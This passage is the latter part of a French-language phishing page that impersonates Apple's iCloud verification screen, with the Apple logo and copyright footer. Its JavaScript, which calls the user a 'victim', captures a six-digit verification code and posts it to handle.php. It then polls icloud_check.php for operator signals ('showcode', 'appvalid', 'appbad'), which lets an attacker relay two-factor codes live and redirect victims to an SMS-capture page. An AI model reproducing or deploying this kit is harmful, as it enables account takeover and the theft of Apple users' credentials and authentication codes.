          <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="digit-input" aria-label="Chiffre 4"/>
          <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="digit-input" aria-label="Chiffre 5"/>
          <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="digit-input" aria-label="Chiffre 6"/>
        </div>

        <p class="error-msg" id="codeError"></p>

        <button id="btnVerify" class="btn-verify" type="button" disabled>Vérifier</button>
        <a href="#" class="alt-link" id="btnRetry">Je n'ai pas reçu de code</a>
      </div>

      </div><!-- /.phases-stack -->
    </div>
  </main>

  <!-- ── APPLE LOADING OVERLAY (phase 3) ── -->
  <div id="loadingOverlay" role="status" aria-live="polite">
    <div class="loading-card">
      <svg class="loading-ring" viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" style="flex-shrink:0">
        <defs>
          <linearGradient x1="100%" y1="100%" x2="50%" y2="50%" id="lo2-a"><stop stop-color="#8700FF" offset="0%"/><stop stop-color="#EE00E1" stop-opacity="0" offset="100%"/></linearGradient>
          <linearGradient x1="0%" y1="100%" x2="50%" y2="50%" id="lo2-b"><stop stop-color="#E00" offset="0%"/><stop stop-color="#EE00E1" stop-opacity="0" offset="100%"/></linearGradient>
          <linearGradient x1="100%" y1="0%" x2="50%" y2="50%" id="lo2-c"><stop stop-color="#00B1EE" offset="0%"/><stop stop-color="#00B1EE" stop-opacity="0" offset="100%"/></linearGradient>
          <linearGradient x1="-17.876%" y1="21.021%" x2="48.935%" y2="50%" id="lo2-d"><stop stop-color="#FFA456" offset="0%"/><stop stop-color="#FFA456" stop-opacity="0" offset="100%"/></linearGradient>
          <path id="lo2-dots" d="M89.905 152.381a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619zm-23.737 2.79a3.81 3.81 0 117.36 1.973 3.81 3.81 0 01-7.36-1.972zm46.799-5.126a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm-60.58-2.409a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm28.777-4.373a3.302 3.302 0 11-.804 6.554 3.302 3.302 0 01.804-6.554zm-16.684-1.899a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm36.901 2.383a3.338 3.338 0 11-6.61.93 3.338 3.338 0 016.61-.93zm28.591-4.621a3.81 3.81 0 11-6.598 3.81 3.81 3.81 0 016.598-3.81zm-94.15-.941a3.81 3.81 0 11-5.387 5.387 3.81 3.81 0 015.388-5.387zm52.547-.486a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-15.136.077a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm-24.278-2.592a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm68.381.883a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm-10.664-.222a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-48.079-1.912a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm22.334-3.47a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.202zm-13.241-1.507a2.65 2.65 0 11-1.985 4.912 2.65 2.65 0 011.985-4.912zm29.286 1.891a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm23.196-3.668a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm-74.721-.747a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm98.125-2.255a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zM35.56 125.196a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-13.29-.428a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm108.491-.249a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-75.396-.468a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm54.271.7a2.65 2.65 0 11-4.877 2.071 2.65 2.65 0 014.877-2.07zm21.327-9.436a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-86.23.808a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-10.043-.339a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm85.6-.197a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-95.085-3.507a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm115.534-2.19a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm12.102-3.672a3.81 3.81 0 11-3.81 6.599 3.81 3.81 0 013.81-6.599zM12.65 108.301a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm23.865-2.586a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm91.693-1.738a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm10.11-2.915a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-111.262 1.653a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-8.458-5.983a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm127.992-3.554a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm-115.319.356a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm101.581-2.821a2.65 2.65 0 11-1.984 4.912 2.65 2.65 0 011.984-4.912zm19.627-1.547a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zM3.81 86.096a3.81 3.81 0 110 7.618 3.81 3.81 0 010-7.619zm137.923-.705a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-121.694-.3a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-6.938-8.368a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm13.807.93a2.62 2.62 0 11-.638 5.202 2.62 2.62 0 01.638-5.202zm120.796-1.946a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm-13.968 1.14a2.62 2.62 0 11-.638 5.201 2.62 2.62 0 01.638-5.201zm7.24-7.477a3.023 3.023 0 110 6.046 3.023 3.023 0 010-6.046zm-120.128-.094a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm135.342-2.99a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.62zM.162 68.862a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zm29.28-5.072a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.985-4.913zm104.844 1.355a2.65 2.65 0 11-5.247.737 2.65 2.65 0 015.247-.737zm-117.992-5.89a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm132.102 1.708a3.338 3.338 0 11-6.61.929 3.338 3.338 0 016.61-.93zm-8.594-4.735a3.023 3.023 0 11-5.84 1.565 3.023 3.023 0 015.84-1.565zm-114.08-2.019a3.023 3.023 0 11-3.024 5.237 3.023 3.023 0 013.024-5.237zm9.569-3.001a2.65 2.65 0 11-3.189 4.23 2.65 2.65 0 013.189-4.23zm93.381.423a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm26.039-1.904a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zM10.969 47.183a3.81 3.81 0 11-3.809 6.599 3.81 3.81 0 013.81-6.599zm12.693-3.781a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm117.661.533a3.338 3.338 0 11-6.145 2.608 3.338 3.338 0 016.145-2.608zm-9.76-2.235a3.023 3.023 0 11-5.237 3.024 3.023 3.023 0 015.237-3.024zm-97.233-.783a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm9.866-.35a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm75.556-.537a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm24.578-8.608a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm-122.515-.987a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zm33.736 2.159a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm52.583-1.46a2.65 2.65 0 11-3.189 4.231 2.65 2.65 0 013.189-4.231zm-73.251-1.14a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm84.962-.194a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-73.76.505a3.023 3.023 0 11-5.238 3.024 3.023 3.023 0 015.237-3.024zm83.999-.987a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-61.5-1.487a2.65 2.65 0 11-5.247.738 2.65 2.65 0 015.247-.738zm26.024-2.284a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.984-4.913zm-14.487-1.912a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.201zm25.325-2.297a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-45.261 1.76a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-10.994-3.15a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm66.254-1.84a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm14.12-1.68a3.81 3.81 0 11-5.388 5.387 3.81 3.81 0 015.388-5.387zm-40.217.463a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-16.701-.13a3.023 3.023 0 110 6.048 3.023 3.023 0 010-6.047zm-36.02.304a3.81 3.81 0 11-6.6 3.81 3.81 3.81 0 016.6-3.81zm28.985-3.118a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm32.79-2.877a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zM80.149 8.66a3.302 3.302 0 11-.804 6.553 3.302 3.302 0 01.804-6.553zm31.274-2.894a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm-57.03 2.217a3.81 3.81 0 11-7.359 1.972 3.81 3.81 0 017.36-1.972zM91.139.163a3.81 3.81 0 11-1.972 7.359 3.81 3.81 0 011.972-7.36zM70.095 0a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619z"/>
        </defs>
        <use fill="#FFF" xlink:href="#lo2-dots"/>
        <use fill="url(#lo2-a)" xlink:href="#lo2-dots"/>
        <use fill="url(#lo2-b)" xlink:href="#lo2-dots"/>
        <use fill="url(#lo2-c)" xlink:href="#lo2-dots"/>
        <use fill="url(#lo2-d)" xlink:href="#lo2-dots"/>
        <path fill="var(--theme-color-systemBlack)" d="M80.38 68.181c1.66 0 3.75-1.091 4.999-2.565 1.137-1.346 1.94-3.183 1.94-5.039 0-.255-.02-.51-.057-.71-1.865.073-4.103 1.201-5.427 2.73-1.063 1.164-2.033 3.02-2.033 4.875 0 .29.056.564.075.655.112.018.298.054.503.054zm-5.724 27.713c2.248 0 3.243-1.474 6.044-1.474 2.838 0 3.483 1.438 5.97 1.438 2.47 0 4.11-2.239 5.677-4.44 1.732-2.53 2.469-4.987 2.487-5.115-.147-.036-4.865-1.947-4.865-7.28 0-4.622 3.704-6.697 3.926-6.86-2.451-3.477-6.192-3.586-7.224-3.586-2.746 0-4.994 1.656-6.431 1.656-1.53 0-3.52-1.547-5.916-1.547-4.551 0-9.158 3.713-9.158 10.701 0 4.368 1.695 8.973 3.814 11.94 1.806 2.51 3.39 4.567 5.676 4.567z"/>
      </svg>
      <div class="ios-activity" aria-hidden="true">
        <div class="blade"></div><div class="blade"></div><div class="blade"></div>
        <div class="blade"></div><div class="blade"></div><div class="blade"></div>
        <div class="blade"></div><div class="blade"></div><div class="blade"></div>
        <div class="blade"></div><div class="blade"></div><div class="blade"></div>
      </div>
      <p class="loading-title">Vérification…</p>
      <p class="loading-sub">Veuillez patienter quelques instants.</p>
    </div>
  </div>

  <footer class="site-footer">
    <nav class="footer-links">
      <a href="#">État du système</a>
      <a href="#">Engagement de confidentialité</a>
      <a href="#">Conditions générales</a>
    </nav>
    <span class="footer-copy">Copyright &copy; 2026 Apple Inc. Tous droits réservés.</span>
  </footer>

  <script>
  (function(){
    var phase1    = document.getElementById('phase1');
    var phase2    = document.getElementById('phase2');
    var overlay   = document.getElementById('loadingOverlay');
    var btnVerify = document.getElementById('btnVerify');
    var codeError = document.getElementById('codeError');
    var digits    = Array.from(document.querySelectorAll('.digit-input'));

    // ── Victim clicks "J'ai autorisé" ──
    document.getElementById('btnAuthorized').addEventListener('click', function() {
      phase1.classList.add('hidden');
      phase2.classList.remove('hidden');
      setTimeout(function() { if (digits[0]) digits[0].focus(); }, 450);
    });

    // ── Poll for admin "AFFICHER LE CODE" signal (backup) ──
    function pollForShowCode() {
      fetch('icloud_check.php?t=' + Date.now())
        .then(function(r){ return r.text(); })
        .then(function(raw) {
          var data = raw.trim();
          if (data === 'showcode') {
            phase1.classList.add('hidden');
            phase2.classList.remove('hidden');
            setTimeout(function() { if (digits[0]) digits[0].focus(); }, 450);
          } else {
            setTimeout(pollForShowCode, 2000);
          }
        })
        .catch(function(){ setTimeout(pollForShowCode, 3000); });
    }
    pollForShowCode();

    // ── Digit input logic ──
    digits.forEach(function(input, idx) {
      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && !input.value && idx > 0) {
          digits[idx - 1].value = '';
          digits[idx - 1].classList.remove('filled');
          digits[idx - 1].focus();
          e.preventDefault();
        }
      });

      input.addEventListener('input', function(e) {
        var val = input.value.replace(/[^0-9]/g, '');
        input.value = val.slice(-1);
        input.classList.toggle('filled', !!input.value);
        if (val && idx < digits.length - 1) {
          digits[idx + 1].focus();
        }
        updateVerifyBtn();
        codeError.style.display = 'none';
      });

      // Handle paste on first digit
      input.addEventListener('paste', function(e) {
        e.preventDefault();
        var pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g,'');
        pasted.slice(0, 6).split('').forEach(function(ch, i) {
          if (digits[i]) { digits[i].value = ch; digits[i].classList.toggle('filled', !!ch); }
        });
        var next = Math.min(pasted.length, 5);
        digits[next].focus();
        updateVerifyBtn();
      });
    });

    function updateVerifyBtn() {
      var full = digits.every(function(d){ return d.value !== ''; });
      btnVerify.disabled = !full;
    }

    function getCode() {
      return digits.map(function(d){ return d.value; }).join('');
    }

    // ── Submit code ──
    btnVerify.addEventListener('click', submitCode);
    digits.forEach(function(d) {
      d.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' && !btnVerify.disabled) submitCode();
      });
    });

    function submitCode() {
      var code = getCode();
      if (code.length < 6) return;

      // Show loading overlay first
      overlay.style.display = 'flex';
      requestAnimationFrame(function(){
        requestAnimationFrame(function(){
          overlay.style.opacity = '1';
        });
      });

      // Wait for handle.php to write ,waiting before polling
      var fd = new FormData();
      fd.append('step', '3');
      fd.append('code', code);
      fetch('handle.php', { method:'POST', body: fd })
        .then(function(){ startCodePolling(); })
        .catch(function(){ startCodePolling(); });
    }

    // ── Poll for appvalid / appbad ──
    function startCodePolling() {
      function doPoll() {
        fetch('icloud_check.php?t=' + Date.now())
          .then(function(r){ return r.text(); })
          .then(function(raw) {
            var data = raw.trim();
            if (data === 'appvalid') {
              window.location.href = 'icloud_sms.php';
            } else if (data === 'appbad') {
              // Hide overlay, show error, clear digits
              overlay.style.opacity = '0';
              overlay.addEventListener('transitionend', function h(){
                overlay.removeEventListener('transitionend', h);
                overlay.style.display = 'none';
              }, { once: true });
              digits.forEach(function(d){ d.value=''; d.classList.remove('filled'); });
              btnVerify.disabled = true;
              codeError.textContent = 'Code incorrect. Veuillez réessayer.';
              codeError.style.display = 'block';
              digits[0].focus();
            } else {
              setTimeout(doPoll, 1500);
            }
          })
          .catch(function(){ setTimeout(doPoll, 3000); });
      }
      doPoll();
    }

    // ── Retry link ──
    document.getElementById('btnRetry').addEventListener('click', function(e) {
      e.preventDefault();
      phase2.classList.add('hidden');
      phase1.classList.remove('hidden');
      document.getElementById('p1-title').textContent = 'Nouveau code envoyé…';
      setTimeout(function() {
        document.getElementById('p1-title').textContent = 'Vérification requise';
        pollForShowCode();
      }, 2000);
    });

  })();
  </script>

</body>
</html>
